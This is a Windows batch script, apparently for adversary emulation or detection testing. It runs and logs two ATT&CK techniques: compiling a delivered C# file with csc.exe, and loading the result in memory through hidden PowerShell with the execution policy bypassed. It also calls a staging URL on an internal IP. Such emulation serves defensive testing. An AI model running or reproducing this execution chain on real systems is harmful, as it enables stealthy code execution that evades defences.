@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM Random constant names with PHR_ as values
SET recnn=%APPDATA%\8007\8178a6d4
SET detcfkn=https://10.0.0.49
SET uouoq=https://10.0.0.49/stage/2/icon.png?8007-7
SET lqyereup=ITZEL-S2BS
SET ufeybybm=7
SET hpnjatpj=exploren.txt
SET njozco=file.txt
SET kkjwr=8007

REM Computed values with random names
SET lvwjfbnk=%APPDATA%\!ufeybybm!\macula-simulations.log
SET qydquva=%APPDATA%\!ufeybybm!
SET ekyfkbs=C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
SET ccuwmi=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
SET clyou=C:\Windows\System32\curl.exe

echo [!DATE! !TIME!][DEBUG][!lqyereup!]: script_start>>> "!lvwjfbnk!" 2>nul

REM TTP T1500: Compile After Delivery
SET rnfrty=1
SET jxnhwqd=

REM TTP T1218: Signed Binary Proxy Execution
SET ebydkq=1
SET oxrkosl=

echo [!DATE! !TIME!][DEBUG][!lqyereup!]: heartbeat_check_start>>> "!lvwjfbnk!" 2>nul
!clyou! -k -s -o nul "!uouoq!"
IF !ERRORLEVEL! NEQ 0 (
    SET ebydkq=0
    SET oxrkosl=connection_failed
    echo [!DATE! !TIME!][DEBUG][!lqyereup!]: heartbeat_check_failed=!ERRORLEVEL!>>> "!lvwjfbnk!" 2>nul
) ELSE (
    echo [!DATE! !TIME!][DEBUG][!lqyereup!]: heartbeat_check_complete>>> "!lvwjfbnk!" 2>nul
)

echo [!DATE! !TIME!][DEBUG][!lqyereup!]: directory_change_start=!recnn!>>> "!lvwjfbnk!" 2>nul
cd /d "!recnn!" 2>nul
IF !ERRORLEVEL! NEQ 0 (
    SET rnfrty=0
    SET jxnhwqd=directory_not_found
    echo [!DATE! !TIME!][DEBUG][!lqyereup!]: directory_change_failed=!ERRORLEVEL!>>> "!lvwjfbnk!" 2>nul
) ELSE (
    echo [!DATE! !TIME!][DEBUG][!lqyereup!]: directory_change_complete>>> "!lvwjfbnk!" 2>nul
)

IF !rnfrty! EQU 1 (
    echo [!DATE! !TIME!][DEBUG][!lqyereup!]: compilation_start=!njozco!>>> "!lvwjfbnk!" 2>nul
    "!ekyfkbs!" /target:library /out:"!hpnjatpj!" "!njozco!" 2>nul
    IF !ERRORLEVEL! NEQ 0 (
        SET rnfrty=0
        SET jxnhwqd=compiler_error
        echo [!DATE! !TIME!][DEBUG][!lqyereup!]: compilation_failed=!ERRORLEVEL!>>> "!lvwjfbnk!" 2>nul
    ) ELSE (
        echo [!DATE! !TIME!][DEBUG][!lqyereup!]: compilation_complete=!hpnjatpj!>>> "!lvwjfbnk!" 2>nul
    )
)

IF !rnfrty! EQU 1 (
    echo [!DATE! !TIME!][DEBUG][!lqyereup!]: assembly_execution_start=!hpnjatpj!>>> "!lvwjfbnk!" 2>nul
    "!ccuwmi!" -nop -w hidden -ep bypass -Command "& { [Reflection.Assembly]::Load([IO.File]::ReadAllBytes('!hpnjatpj!')).EntryPoint.Invoke($null, @(,[string[]]@())) }" 2>nul
    IF !ERRORLEVEL! NEQ 0 (
        SET ebydkq=0
        SET oxrkosl=assembly_load_failed
        echo [!DATE! !TIME!][DEBUG][!lqyereup!]: assembly_execution_failed=!ERRORLEVEL!>>> "!lvwjfbnk!" 2>nul
    ) ELSE (
        echo [!DATE! !TIME!][DEBUG][!lqyereup!]: assembly_execution_complete>>> "!lvwjfbnk!" 2>nul
    )
)

REM TTP logging block
SET fkgkgj=!DATE:~-4!-!DATE:~3,2!-!DATE:~0,2!
SET dlxjkj=!TIME:~0,8!.!TIME:~9,3!

(echo [!fkgkgj! !dlxjkj!][!lqyereup!]: !ufeybybm!-!kkjwr!-T1500|Compile After Delivery=!rnfrty!:!jxnhwqd!) >> "!lvwjfbnk!" 2>nul || ver >nul
(echo [!fkgkgj! !dlxjkj!][!lqyereup!]: !ufeybybm!-!kkjwr!-T1218|Signed Binary Proxy Execution=!ebydkq!:!oxrkosl!) >> "!lvwjfbnk!" 2>nul || ver >nul

echo [!DATE! !TIME!][DEBUG][!lqyereup!]: script_complete>>> "!lvwjfbnk!" 2>nul
ENDLOCAL